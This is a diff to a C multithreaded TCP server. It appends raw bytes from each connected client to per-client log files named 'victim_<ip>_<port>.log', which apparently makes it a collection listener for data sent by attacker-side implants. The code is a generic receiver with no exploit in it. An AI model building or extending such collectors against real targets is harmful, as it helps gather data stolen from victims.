@@ -4,6 +4,8 @@
 #include <unistd.h>
 #include <arpa/inet.h>
 #include <pthread.h>
+#include <sys/stat.h> // For mkdir
+#include <errno.h>
 
 #define BUF_SIZE 1024
 #define BACKLOG 2
@@ -15,12 +17,37 @@ typedef struct
     int client_port; // Client port (for debug)
 } client_info_t;
 
+void init_log_directory(void)
+{
+    if (mkdir("logs", 0777) == -1)
+    {
+        if (errno != EEXIST)
+        {
+            perror("mkdir logs");
+        }
+    }
+}
+
 void *handle_client(void *arg)
 {
     client_info_t *client = (client_info_t *)arg;
     char buffer[BUF_SIZE];
+    char filename[256];
+    FILE *log_file;
 
     printf("(+) Client connected from %s:%d\n", client->client_ip, client->client_port);
+
+    // Unique log file name for each client (ip + port)
+    snprintf(filename, sizeof(filename), "logs/victim_%s_%d.log", client->client_ip, client->client_port);
+
+    log_file = fopen(filename, "a");
+    if (!log_file)
+    {
+        perror("fopen log_file");
+        close(client->socket_fd);
+        free(client);
+        pthread_exit(NULL);
+    }
 
     while (1)
     {
@@ -33,10 +60,15 @@ void *handle_client(void *arg)
             break;
         }
 
-        printf("%.*s", bytes_received, buffer); // Print raw bytes from this client
+        printf("%.*s", bytes_received, buffer);
         fflush(stdout);
+
+        // Append to this client's log file
+        fprintf(log_file, "%.*s", bytes_received, buffer);
+        fflush(log_file);
     }
 
+    fclose(log_file);
     close(client->socket_fd);
     free(client);
     pthread_exit(NULL);
@@ -56,6 +88,8 @@ int main(int argc, char *argv[])
             i++;
         }
     }
+
+    init_log_directory(); // Make sure logs exists (TODO later: if not, create directory)
 
     server_fd = socket(AF_INET, SOCK_STREAM, 0);
     if (server_fd < 0)
@@ -96,9 +130,6 @@ int main(int argc, char *argv[])
             continue;
         }
 
-        // Dynamically allocate memory for the client fd.
-        // Prevents a race condition where the main thread overwrites
-        // the client_data variable before the new thread has a chance to read it.
         client_info_t *client_data = malloc(sizeof(client_info_t));
         if (!client_data)
         {
